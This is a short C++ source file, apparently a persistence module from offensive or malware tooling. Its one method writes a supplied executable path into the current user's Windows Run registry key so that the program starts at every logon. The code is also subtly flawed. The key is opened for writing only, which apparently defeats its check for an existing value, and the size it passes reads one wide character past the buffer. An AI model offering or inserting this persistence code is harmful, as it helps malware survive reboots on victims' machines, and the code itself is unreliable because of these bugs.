#include <Windows.h>
#include <string>
#include <iostream>
#include "Utils.h"

using namespace std;

class PersistenceClass {
public:
    int persistenceViaRunKeys(const char* exe, LPCWSTR keyName) {
        HKEY hkey = NULL;
        LONG res = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
        if (res == ERROR_SUCCESS) {
            DWORD dataSize = 0;
            res = RegQueryValueExW(hkey, keyName, NULL, NULL, NULL, &dataSize);
            if (res != ERROR_SUCCESS) {
                wchar_t* wide_exe = NULL;
                int wide_len = MultiByteToWideChar(CP_UTF8, 0, exe, -1, NULL, 0);
                wide_exe = new wchar_t[wide_len];
                MultiByteToWideChar(CP_UTF8, 0, exe, -1, wide_exe, wide_len);
                RegSetValueExW(hkey, keyName, 0, REG_SZ, (BYTE*)wide_exe, (wide_len + 1) * sizeof(wchar_t));
                delete[] wide_exe;
            }
            RegCloseKey(hkey);
        }
        return 0;
    }


};
